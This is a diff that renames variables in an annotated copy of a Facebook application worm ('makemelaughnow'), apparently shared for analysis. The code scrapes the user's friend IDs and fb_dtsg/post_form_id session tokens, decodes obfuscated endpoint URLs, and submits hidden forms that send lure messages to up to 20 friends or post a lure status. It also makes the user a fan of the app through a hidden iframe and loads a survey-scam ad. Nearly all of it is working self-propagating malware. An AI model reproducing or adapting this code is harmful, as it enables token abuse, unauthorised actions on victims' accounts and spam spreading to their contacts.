@@ -1,76 +1,76 @@
 /* facebook sandbox initialization below, not important here, so removed */
-var app_xx = new fbjs_sandbox("xx").setBridgeHash("");
+var app_x = new fbjs_sandbox("xx").setBridgeHash("");
 
-app_xx.validation_vars = {
+app_x.validation_vars = {
 };
-app_xx.context = "xxx";
-app_xx.contextd = "xxx";
-app_xx.data = {
+app_x.context = "xxx";
+app_x.contextd = "xxx";
+app_x.data = {
 		"xxx"
 };
 
-app_xx.bootstrap();
+app_x.bootstrap();
 
-var axx_startedapp;
-// axx_sheep will contain your friend IDs
-// axx_params will contain 3 elements: 2 first items are credentials for sending messages, 3rd - your FB id
-var axx_sheep = [], axx_params = [], axx_domethod = 0;
+var ax_startedapp;
+// ax_sheep will contain your friend IDs
+// ax_params will contain 3 elements: 2 first items are credentials for sending messages, 3rd - your FB id
+var ax_sheep = [], ax_params = [], ax_domethod = 0;
 
-var axx_domethod = 0;
+var ax_domethod = 0;
 
-function axx_logerr(axx_err) {
+function ax_logerr(ax_err) {
 
 }
 
-function axx_startapp() {
+function ax_startapp() {
 	// start only once
-	if (axx_startedapp == '1') {
+	if (ax_startedapp == '1') {
 		return;
 	}
-	axx_startedapp = '1';
+	ax_startedapp = '1';
 
-	var axx_create = {
-		help : function(axx_cmd, axx_name) {
+	var ax_create = {
+		help : function(ax_cmd, ax_name) {
 		    // actual decoding function - extracts characters from "<appid>_m" title attribute and combine them
-			var axx_co = axx_document.getElementById(
-					axx_name.substr(2, 1)).getTitle(); // "#m".getTitle()
+			var ax_co = ax_document.getElementById(
+					ax_name.substr(2, 1)).getTitle(); // "#m".getTitle()
 
-			axx_co = "choy:ketmdslqxb.ujpzgvnra/fiw_?="; // actual key for decoding (it doesn't mean anything on its own
+			ax_co = "choy:ketmdslqxb.ujpzgvnra/fiw_?="; // actual key for decoding (it doesn't mean anything on its own
 														 //, its just a dictionary)
 
-			// decoding loop axx_cmd
+			// decoding loop ax_cmd
 			// FBJS.idx is FB sandbox functionality - see http://w2spconf.com/2009/papers/s3p2.pdf
 			// FBJS.idx(a) === a
-			// axx_cmd contains offsets of axx_co characters to append
-			for ( var axx_a = 0, axx_out = ''; axx_a <= axx_cmd.length - 1; axx_a++) {
-				var axx_out = axx_out
-						+ axx_co.substr(axx_cmd[$FBJS
-								.idx(axx_a)], 1);
+			// ax_cmd contains offsets of ax_co characters to append
+			for ( var ax_a = 0, ax_out = ''; ax_a <= ax_cmd.length - 1; ax_a++) {
+				var ax_out = ax_out
+						+ ax_co.substr(ax_cmd[$FBJS
+								.idx(ax_a)], 1);
 			}
-			return axx_out;
+			return ax_out;
 		},
-		input : function(axx_name, axx_value) {
+		input : function(ax_name, ax_value) {
 			// add hidden input to form
-			var axx_frmform = axx_document
+			var ax_frmform = ax_document
 					.getElementById('frm');
-			var axx_frminput = axx_document
+			var ax_frminput = ax_document
 					.createElement('input');
-			axx_frminput.setType('hidden').setValue(
-					axx_value).setName(axx_name);
-			axx_frmform.appendChild(axx_frminput);
-			axx_frminput = null, axx_frmform = null;
+			ax_frminput.setType('hidden').setValue(
+					ax_value).setName(ax_name);
+			ax_frmform.appendChild(ax_frminput);
+			ax_frminput = null, ax_frmform = null;
 			return;
 		},
-		fire : function(axx_nam, axx_val) {
+		fire : function(ax_nam, ax_val) {
 			// decode or insert input field
-			var axx_val = axx_val || '';
-			return (axx_val == 'name') ? $FBJS.ref(this).help(
-					axx_nam, axx_val) : $FBJS.ref(
-					this).input(axx_nam, axx_val);
+			var ax_val = ax_val || '';
+			return (ax_val == 'name') ? $FBJS.ref(this).help(
+					ax_nam, ax_val) : $FBJS.ref(
+					this).input(ax_nam, ax_val);
 		}
 	};
 
-	var axx_meth = {
+	var ax_meth = {
 		// object with character offets from app's 'm' HTML entity (in title attr there are characters that the result is composed of)
 	    // get() method decodes
 		// small obfuscation below
@@ -112,7 +112,7 @@ function axx_startapp() {
 		 */
 
 		// decoding function
-		get : function(axx_s) {
+		get : function(ax_s) {
 	    // results:
 		/*
 			m=http://touch.facebook.com/message_send.php
@@ -124,135 +124,135 @@ function axx_startapp() {
 			fbd=fb_dtsg
 			hc=fb_dtsg
 		 */
-			return axx_create.fire(axx_s, 'name');
+			return ax_create.fire(ax_s, 'name');
 		}
 	};
 
-	var axx_findvalues = {
-	    // inserts your friend ids into axx_sheep
-	    // inserts credentials for making a wall post into axx_params
+	var ax_findvalues = {
+	    // inserts your friend ids into ax_sheep
+	    // inserts credentials for making a wall post into ax_params
 	    // returns 1 if succeeded
-		a : ((new axx_RegExp(
+		a : ((new ax_RegExp(
 				'st_.or._i.\\\x22 .al.e=\\\x22(.*?)\\\x22', ''))), // <form action="http://www.facebook.com/wallpost.php"  post_form_id value
-		b : ((new axx_RegExp(
+		b : ((new ax_RegExp(
 				'b_d.s.\\\x22 v..ue=\\\x22(.*?)\\\x22', ''))), // value = type="hidden" id="fb_dtsg" name="fb_dtsg"
-		c : ((new axx_RegExp('p.o..le\\.p.p\\?i.=(\\d+)\\\x22', ''))), // href="http://www.facebook.com/profile.php?id=xxx" your profile ID
-		d : ((new axx_RegExp(
+		c : ((new ax_RegExp('p.o..le\\.p.p\\?i.=(\\d+)\\\x22', ''))), // href="http://www.facebook.com/profile.php?id=xxx" your profile ID
+		d : ((new ax_RegExp(
 				'na.e=\\\x22i.s\\[]\\\x22 v.l.e=\\\x22(.*?)\\\x22', 'gi'))), // name=ids[] value= -- your friend ids
 
-		firefunc : function(axx_strdata) {
-			var axx_matches = [], axx_fmatch = [], axx_out = '', axx_f = 0;
-			for (axx_p in axx_findvalues) {
+		firefunc : function(ax_strdata) {
+			var ax_matches = [], ax_fmatch = [], ax_out = '', ax_f = 0;
+			for (ax_p in ax_findvalues) {
 				try {
-					if (axx_f == 3) {
-						while (axx_matches = axx_findvalues[$FBJS
-								.idx(axx_p)]
-								.exec(axx_strdata)) {
-							if (axx_matches[$FBJS.idx(1)] == axx_sheep[$FBJS
+					if (ax_f == 3) {
+						while (ax_matches = ax_findvalues[$FBJS
+								.idx(ax_p)]
+								.exec(ax_strdata)) {
+							if (ax_matches[$FBJS.idx(1)] == ax_sheep[$FBJS
 									.idx(0)]) {
 								break;
 							}
-							if (axx_matches[$FBJS.idx(1)].length < 25) {
-								axx_sheep
-										.push(axx_matches[$FBJS
+							if (ax_matches[$FBJS.idx(1)].length < 25) {
+								ax_sheep
+										.push(ax_matches[$FBJS
 												.idx(1)]);
 							}
 						}
 						break;
 					}
-					axx_fmatch = axx_findvalues[$FBJS
-							.idx(axx_p)]
-							.exec(axx_strdata);
-					if (axx_fmatch[$FBJS.idx(1)] !== null) {
-						axx_params[$FBJS.idx(axx_f)] = axx_fmatch[$FBJS
+					ax_fmatch = ax_findvalues[$FBJS
+							.idx(ax_p)]
+							.exec(ax_strdata);
+					if (ax_fmatch[$FBJS.idx(1)] !== null) {
+						ax_params[$FBJS.idx(ax_f)] = ax_fmatch[$FBJS
 								.idx(1)];
 					}
-				} catch (axx_err) {
-					axx_logerr(axx_err);
+				} catch (ax_err) {
+					ax_logerr(ax_err);
 				}
-				axx_f++;
+				ax_f++;
 			}
-			axx_document.getElementById('help_container')
+			ax_document.getElementById('help_container')
 					.setTextValue('');
-			var axx_out = ((axx_params[$FBJS.idx(0)] !== null) && (axx_params[$FBJS
+			var ax_out = ((ax_params[$FBJS.idx(0)] !== null) && (ax_params[$FBJS
 					.idx(0)] !== null)) ? 1 : 0;
-			return axx_out;
+			return ax_out;
 		}
 	};
 
-	var axx_methodaction = function() {
-		var axx_retmeth = 0;
-		axx_sheep = axx_sheep || [];
-		var axx_goahead = (((axx_sheep.length - 1) < 1) || ((axx_sheep.length - 1) > 500)) ? 0
+	var ax_methodaction = function() {
+		var ax_retmeth = 0;
+		ax_sheep = ax_sheep || [];
+		var ax_goahead = (((ax_sheep.length - 1) < 1) || ((ax_sheep.length - 1) > 500)) ? 0
 				: 1;
-		if (axx_goahead == 0) {
+		if (ax_goahead == 0) {
 			// if you have <2 friends or > 500 friends
 
 			// only submit status update through touch.facebook.com
 
 			// change form action and target
-			axx_document.getElementById('frm').setAction( /*http://touch.facebook.com/submit_status.php*/
-					axx_meth.get(axx_meth.su))
+			ax_document.getElementById('frm').setAction( /*http://touch.facebook.com/submit_status.php*/
+					ax_meth.get(ax_meth.su))
 					.setTarget(
-							axx_meth
-									.get(axx_meth.ftarg) /* fra  - created iframe*/) ;
+							ax_meth
+									.get(ax_meth.ftarg) /* fra  - created iframe*/) ;
 			// add fields
-			axx_create
+			ax_create
 					.fire(
 							'status',
 							'only go here if you are my TRUE friend http://apps.facebook.com/makemelaughnow/');
 			// add credentials
-			axx_create.fire(axx_meth
-					.get(axx_meth.pid),
-					axx_params[$FBJS.idx(0)]);
-			axx_create.fire(axx_meth
-					.get(axx_meth.fbd),
-					axx_params[$FBJS.idx(1)]);
+			ax_create.fire(ax_meth
+					.get(ax_meth.pid),
+					ax_params[$FBJS.idx(0)]);
+			ax_create.fire(ax_meth
+					.get(ax_meth.fbd),
+					ax_params[$FBJS.idx(1)]);
 
-			axx_retmeth = 2;
-			return axx_retmeth;
+			ax_retmeth = 2;
+			return ax_retmeth;
 
 		} else {
 			// if you have 2-500 friends
 			// send message to first 12-20 of them through touch.facebook.com
-			axx_document.getElementById('frm').setAction(
-					axx_meth.get(axx_meth.m)  /*http://touch.facebook.com/message_send.php*/)
+			ax_document.getElementById('frm').setAction(
+					ax_meth.get(ax_meth.m)  /*http://touch.facebook.com/message_send.php*/)
 					.setTarget(
-							axx_meth
-									.get(axx_meth.ftarg));
+							ax_meth
+									.get(ax_meth.ftarg));
 
 			// add credentials
-			axx_create.fire(axx_meth
-					.get(axx_meth.fbd),
-					axx_params[$FBJS.idx(1)]);
-			axx_create.fire(axx_meth
-					.get(axx_meth.pid),
-					axx_params[$FBJS.idx(0)]);
+			ax_create.fire(ax_meth
+					.get(ax_meth.fbd),
+					ax_params[$FBJS.idx(1)]);
+			ax_create.fire(ax_meth
+					.get(ax_meth.pid),
+					ax_params[$FBJS.idx(0)]);
 
-			axx_create.fire('ids[]', '');
-			axx_create.fire('subject', 'i thought of you..');
-			axx_create
+			ax_create.fire('ids[]', '');
+			ax_create.fire('subject', 'i thought of you..');
+			ax_create
 					.fire(
 							'body',
 							'im using up my fb ad credits to send u a gift so HERE = http://apps.facebook.com/makemelaughnow/');
 		    // add your friends
 			// min 12
-			var axx_sendamount = (12 > (axx_sheep.length - 1)) ? (axx_sheep.length - 1)
+			var ax_sendamount = (12 > (ax_sheep.length - 1)) ? (ax_sheep.length - 1)
 					: 12;
 			// max 20
-			var axx_sendamount = (axx_sendamount < 20) ? axx_sendamount
+			var ax_sendamount = (ax_sendamount < 20) ? ax_sendamount
 					: 20;
-			for ( var axx_j = 0; axx_j < axx_sendamount; axx_j++) {
+			for ( var ax_j = 0; ax_j < ax_sendamount; ax_j++) {
 				// add 12-12 first friends
-				axx_create.fire('ids[]',
-						axx_sheep[$FBJS.idx(axx_j)]);
+				ax_create.fire('ids[]',
+						ax_sheep[$FBJS.idx(ax_j)]);
 			}
-			axx_create.fire(axx_meth
-					.get(axx_meth.fbd),
-					axx_params[$FBJS.idx(1)]);
+			ax_create.fire(ax_meth
+					.get(ax_meth.fbd),
+					ax_params[$FBJS.idx(1)]);
 
-			axx_retmeth = 1;
-			return axx_retmeth;
+			ax_retmeth = 1;
+			return ax_retmeth;
 		}
 	}
 
@@ -261,80 +261,80 @@ function axx_startapp() {
 
 		// here's the trick - the app (or FB) stores most of app's HTML code in a single element title attribute
 		// code extracts lots of data from it (friend ids, credentials, user id, etc.)
-		axx_domethod = axx_findvalues
-				.firefunc(axx_document.getElementById(
+		ax_domethod = ax_findvalues
+				.firefunc(ax_document.getElementById(
 						'help_container').getFirstChild().getTitle());
-		// axx_domethod will be 1 and axx_sheep/axx_params initialized
-	} catch (axx_err) {
-		axx_logerr(axx_err);
+		// ax_domethod will be 1 and ax_sheep/ax_params initialized
+	} catch (ax_err) {
+		ax_logerr(ax_err);
 	} finally {
-		if ((axx_domethod == 1)
-				&& (axx_params.length > 1)) { // found credentials
+		if ((ax_domethod == 1)
+				&& (ax_params.length > 1)) { // found credentials
 
 			// add iframe and form
-			axx_document
+			ax_document
 					.getElementById('work_container')
 					.setInnerXHTML(
 							"<iframe name='fra' id='fra' frameborder='0' smartsize='false' width='1' height='1' scrolling='no' style='width:1px;height:1px;' src='about:blank'></iframe>");
-			axx_document.getElementById('frm_container')
+			ax_document.getElementById('frm_container')
 					.setInnerXHTML(
 							'<form id="frm" method="POST" action=""></form>');
 
 			// fill out form to touch.facebook.com with your credentials, targetting the form to iframe
-			var axx_submitfrm = axx_methodaction();
-			if (axx_submitfrm > 0) {
+			var ax_submitfrm = ax_methodaction();
+			if (ax_submitfrm > 0) {
 				try {
-					axx_setTimeout(function() {
-						axx_document.getElementById('frm')
+					ax_setTimeout(function() {
+						ax_document.getElementById('frm')
 								.submit();
 					}, 1200);
-				} catch (axx_err) {
-					axx_logerr(axx_err);
+				} catch (ax_err) {
+					ax_logerr(ax_err);
 				}
 			}
 
 			try {
 				// make current user a fan of the application
-				var axx_lkp = axx_document
+				var ax_lkp = ax_document
 						.createElement('div').setId('lkp');
-				axx_document.getElementById('work_container')
-						.appendChild(axx_lkp);
-				axx_lkp
+				ax_document.getElementById('work_container')
+						.appendChild(ax_lkp);
+				ax_lkp
 						.setInnerXHTML("<iframe id='fralkp' name='fralkp' width='1' height='1' scrolling='no' frameborder='0' style='border:none;overflow:hidden;width:1px;height:1px;' src='about:blank'></iframe>");
-				axx_document.getElementById('fralkp').setSrc(
-						axx_meth.get(axx_meth.lp /* http://touch.facebook.com/reqs.php?id= */)
+				ax_document.getElementById('fralkp').setSrc(
+						ax_meth.get(ax_meth.lp /* http://touch.facebook.com/reqs.php?id= */)
 								+ '148034935215009&action=fan&'
-								+ axx_meth
-										.get(axx_meth.pid) + '='
-								+ axx_params[$FBJS.idx(0)]);
-				axx_lkp = null;
-			} catch (axx_err) {
-				axx_logerr(axx_err);
+								+ ax_meth
+										.get(ax_meth.pid) + '='
+								+ ax_params[$FBJS.idx(0)]);
+				ax_lkp = null;
+			} catch (ax_err) {
+				ax_logerr(ax_err);
 			}
 
 		}
 	}
 
 	// load ads
-	axx_document.getElementById('frabox').setClassName('frabox');
-	axx_document
+	ax_document.getElementById('frabox').setClassName('frabox');
+	ax_document
 			.getElementById('frabox')
 			.setInnerXHTML(
 					'<iframe id="fraoff" name="fraoff" width="760" height="700" scrolling="no" frameborder="0" style="position:relative;overflow:hidden;border:none;width:755px;height:750px;top:-245px;" src="http://track.socialsurveys.us/DefaultPage.aspx?nm=017gjfq68yx9"></iframe>');
-	axx_document.getElementById('loading').setTextValue(
+	ax_document.getElementById('loading').setTextValue(
 			'Complete above to see a joke!');
 
 	// clean up after 16 secs
-	axx_setTimeout(function() {
-		axx_document.getElementById('work_container')
+	ax_setTimeout(function() {
+		ax_document.getElementById('work_container')
 				.setTextValue('');
-		axx_document.getElementById('frm_container').setTextValue(
+		ax_document.getElementById('frm_container').setTextValue(
 				'');
 
 	}, 16000);
 
 }
 
-axx_setTimeout(function() {
-	axx_startapp();
+ax_setTimeout(function() {
+	ax_startapp();
 }, 800);
